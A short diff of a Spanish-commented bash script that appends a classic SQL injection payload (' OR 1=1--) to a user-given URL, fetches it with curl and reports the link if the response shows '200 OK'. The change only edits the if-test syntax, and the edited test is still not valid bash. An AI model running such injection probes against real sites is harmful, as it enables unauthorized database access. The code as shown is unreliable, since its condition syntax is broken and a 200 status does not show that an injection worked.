@@ -5,7 +5,7 @@ URL=$(echo -e "$url")
 SQLi="%27+OR+1=1--"
 ATTACK="$URL$SQLi"
 #si el ataque funciona
-if [[ curl -i $ATTACK | grep "200 OK" ]]
+if [ curl -i "$ATTACK" | grep "200 OK" ]
 then
 #muestrame por pantalla una url con el resultado
   echo -e "Haz clic en el siguiente enlace para ver el resultado del ataque: \n$ATTACK"
